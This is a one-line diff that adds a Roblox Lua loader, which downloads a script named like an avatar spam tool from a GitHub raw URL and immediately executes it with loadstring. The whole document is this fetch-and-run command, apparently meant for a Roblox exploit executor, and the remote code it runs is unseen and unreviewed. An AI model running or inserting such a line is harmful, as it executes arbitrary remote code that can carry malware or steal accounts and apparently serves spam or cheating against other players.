@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/my-avatar-spam7-wtm8j2jjo0v4sm.lua"))()
